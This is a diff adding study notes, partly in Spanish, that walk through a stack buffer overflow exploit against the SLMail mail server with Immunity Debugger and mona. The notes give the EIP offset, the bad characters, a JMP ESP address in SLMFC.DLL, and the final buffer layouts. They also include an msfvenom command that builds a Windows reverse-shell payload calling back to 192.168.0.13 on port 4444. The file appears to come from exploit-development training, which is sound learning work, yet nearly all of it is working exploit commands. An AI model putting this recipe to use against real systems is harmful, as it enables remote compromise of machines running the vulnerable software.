@@ -1,0 +1,48 @@
+# https://www.youtube.com/watch?v=sdZ8aE7yxMk
+# inmunity debugger + mona
+1 - conectarse con el proceso (attach)
+
+2 - buffer overflow via script
+
+3 - buffer overflow via script with pattern
+generate random pattern with overflow size:
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
+
+4 - offset where EIP is overflowed
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
+buffer = "A"*2606 + "B"*4 # offset + string test 
+buffer = "A"*2606 + "B"*4 + "C"*500 #A=EIP ,B=EBP, C=ESP-inicio de la pila donde injectar codigo
+
+5 - Crear espacio de trabajo local con Mona after attach process
+!mona config -set workingfolder C:\Users\IEUser\Desktop\%p
+
+6 - badchars array with mona
+!mona bytearray
+
+7 - badchars comparation with mona
+!mona compare -f C:\Users\IEUser\Desktop\SLMail\bytearray.bin -a ESP (017DA128) # para saber que caracteres son badchars y necesitamos sacar 
+!mona byarray -cpb "\x00" # mona crea un listado de badchars sin el 00
+
+repetir el procedimiento hasta que no queden badchars
+
+8 - creamos payload con msfvenom teniendo en cuenta las badchars
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 EXITFUNC=thread LPORT=4444 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
+
+9 - buscando JMP_ESP con OP_CODE
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm> jmp ESP
+
+!mona find -s "/xff/xe4" -m SLMFC.DLL
+
+buffer = "A"*2606 + pack("<L", 0x5f4a358f) + shellcode
+
+10 - NOPS para desencriptar el shellcode (tiempo de espera para que el programa ejecute el shellcode)
+"\x90"*16 + shellcode
+
+buffer = "A"*2606 + pack("<L", 0x5f4a358f) + "\x90"*16  + shellcode
+
+11 - Alternativa a NOPS para que el programa "desplace" la pila
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm> sub esp,0x10
+
+buffer = "A"*2606 + pack("<L", 0x5f4a358f) + "\x83\xEC\x10"  + shellcode
